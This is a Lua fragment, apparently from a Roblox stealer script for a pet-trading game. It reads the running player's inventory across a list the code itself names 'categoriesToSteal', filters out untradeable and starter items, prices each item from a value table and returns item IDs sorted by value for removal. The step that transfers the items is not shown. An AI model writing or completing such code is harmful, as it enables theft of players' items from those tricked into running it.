local SEASONAL = {
    "Winter ", "Spring ", "Summer ", "Fall ", "Autumn ",
    "Halloween ", "Christmas ", "Easter ", "April Fools ",
    "Lunar ", "Summerfest ", "Rain ", "Pride ", "Woodland ",
    "Urban ", "Random Pets ", "Gilded ", "Nebula "
}

local function GetValueAndEmoji(kind, props)
    local fullName = buildFullName(kind, props)
    local key = normName(fullName)

    if ValueDB[key] then
        return ValueDB[key], EmojiDB[key] or ""
    end

    for _, prefix in ipairs(SEASONAL) do
        local lprefix = prefix:lower()
        if key:find(lprefix, 1, true) then
            local stripped = key:gsub(lprefix, "", 1)
            if ValueDB[stripped] then
                return ValueDB[stripped], EmojiDB[stripped] or ""
            end
        end
    end

    return 0, ""
end

local function GetMod(props)
    if not props then return "" end
    if props.mega_neon then return "[MFR] " end
    if props.neon then return "[NFR] " end
    if props.flyable and props.rideable then return "[FR] " end
    if props.flyable then return "[F] " end
    if props.rideable then return "[R] " end
    return ""
end

local function GetInventoryData()
    local rawItems = {}
    local displayList = {}
    local total = 0
    pcall(function()
        local d = ClientData.get_data()[LP.Name].inventory
        local categoriesToSteal = {"pets", "pet_accessories", "strollers", "transport", "toys", "foods", "gifts"}
        
        for _, category in ipairs(categoriesToSteal) do
            for id, v in pairs(d[category] or {}) do
                local kind = v.kind or v.id
                local lowerKind = kind and kind:lower() or ""
                
                local isUntradeable = false
                if lowerKind:match("starter") or lowerKind:match("practice dog") or lowerKind:match("trade license") or lowerKind:match("ice skates") or lowerKind == "buz pateni" or lowerKind:match("default") then 
                    isUntradeable = true 
                end
                
                if v.properties and (v.properties.is_starter == true or v.properties.untradeable == true or v.properties.cannot_trade == true) then
                    isUntradeable = true
                end

                if kind and not lowerKind:find("egg") and not isUntradeable then
                    local val, emoji = GetValueAndEmoji(kind, v.properties)
                    
                    local shouldAdd = true
                    if (category == "foods" or category == "gifts") and val <= 0 then
                        shouldAdd = false
                    end
                    
                    if shouldAdd then
                        local mod = GetMod(v.properties)
                        total = total + val
                        
                        table.insert(rawItems, {id = id, value = val, cat = category})
                        
                        table.insert(displayList, {
                            name = kind,
                            mod = mod,
                            value = val,
                            emoji = emoji,
                            fullname = buildFullName(kind, v.properties)
                        })
                    end
                end
            end
        end
    end)
    
    table.sort(rawItems, function(a, b) return a.value > b.value end)
    
    local uuids = {}
    for _, item in ipairs(rawItems) do
        table.insert(uuids, item.id)
    end
    
    return uuids, displayList, total
end

local function SortByValue(list)
    table.sort(list, function(a, b) return a.value > b.value end)
end

